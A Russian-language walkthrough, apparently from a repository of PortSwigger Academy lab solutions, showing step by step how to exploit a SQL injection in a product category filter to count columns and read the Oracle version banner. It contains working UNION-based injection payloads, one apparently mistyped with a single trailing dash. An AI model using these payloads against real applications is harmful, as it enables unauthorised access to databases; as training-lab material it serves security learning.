Зайдем на предложенный уязвимый ресурс и перейдем на случайную категорию с выбором товаров. Я выбрал `gifts`. И найдем данный запрос в `Proxy` -> `HTTP history` и отправим его в `Repeater`
```
GET /filter?category=Gifts
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/15.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle/pics%20for%20walktrough/1.png)
Проверим, что SQL-инъекция действительно возможна, и уберем значение поля `category`, чтобы не мазолиила глаза
```
GET /filter?category='--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/15.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle/pics%20for%20walktrough/2.png)
Определим количество столбцов в возвращаемой таблице. При следующем запросе нам не выдает ошибку сервиса. Значит, делаем вывод - в таблице 2 столбца
```
GET /filter?category='UNION+SELECT+NULL,NULL+FROM+dual--
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/15.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle/pics%20for%20walktrough/3.png)
согласно замечательному читлисту узннаем, что у нас Oracle DB
```
https://portswigger.net/web-security/sql-injection/cheat-sheet
```
и узнаем информацию о сервере
```
GET /filter?category='UNION+SELECT+BANNER,NULL+FROM+v$version-
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/1.%20SQL%20injection/15.%20SQL%20injection%20attack%2C%20querying%20the%20database%20type%20and%20version%20on%20Oracle/pics%20for%20walktrough/4.png)
Обновим страницу в браузере и получим уведомление об успешно выполненной лабораторной работе
